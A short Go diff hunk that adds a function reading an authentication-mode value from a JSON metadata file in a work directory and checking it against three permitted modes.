@@ -1222,6 +1444,23 @@ func finalizeRun(domain string, paths *config.Paths, cp *checkpoint.Checkpoint, 
 		return summaryErr
 	}
 	return runErr
+}
+
+func authenticationMode(workDir string) (string, error) {
+	data, err := os.ReadFile(filepath.Join(workDir, ".rfuf", "auth_check.json"))
+	if err != nil {
+		return "", fmt.Errorf("read auth health metadata: %w", err)
+	}
+	var metadata struct {
+		Mode string `json:"mode"`
+	}
+	if err := json.Unmarshal(data, &metadata); err != nil {
+		return "", fmt.Errorf("decode auth health metadata: %w", err)
+	}
+	if metadata.Mode != "public" && metadata.Mode != "authenticated_unverified" && metadata.Mode != "authenticated_verified" {
+		return "", fmt.Errorf("invalid auth health mode %q", metadata.Mode)
+	}
+	return metadata.Mode, nil
 }
 
 // CleanWorkspace removes temporary, redundant, and empty artifact directories from the work directory.
